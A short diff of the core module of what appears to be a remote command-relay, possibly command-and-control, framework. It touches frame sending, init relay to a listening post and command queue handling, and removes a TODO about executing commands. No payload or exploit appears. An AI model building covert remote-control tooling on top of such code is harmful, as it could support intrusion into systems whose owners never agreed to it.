@@ -1,6 +1,9 @@
 # ядро - core
 import ast
 
+from copy import copy
+from time import time, sleep
+
 from lib import instructions
 from lib import transmit
 from lib.crypto import asymmetric
@@ -86,7 +89,8 @@ def send_cmd_output(component):
     instruction_frame = instructions.create_instruction_frame(data)
     request_frame = transmit.cook_transmit_frame(component, instruction_frame)
     component.transport.send_data(request_frame)
-    del done_commands # TODO: del command
+    del done_commands
+    del command
     sleep(5)
     reply = component.transport.recv_data()
     uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, reply).decode('utf-8'))
@@ -143,7 +147,6 @@ def relay_init_frame(component, reply):
         component.transport.send_data(reply)
         sleep(5)
         init_response = component.transport.recv_data()
-        component.transport.send_data(b'') # LP Needs some data to stay in sync
         uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, init_response).decode('utf-8'))
         return uncooked_frame
     except Exception as e:
@@ -179,7 +182,6 @@ def process_commands(component):
             command['history'].append(event_history)
             component.cmd_processing_queue.append(command)
             component.cmd_queue.pop(cmd_index)
-            # TODO: Actually execute the command, move it from cmd_processing_queue to cmd_done_queue, relay output
 
 
 def ack_cmds(frame, component):
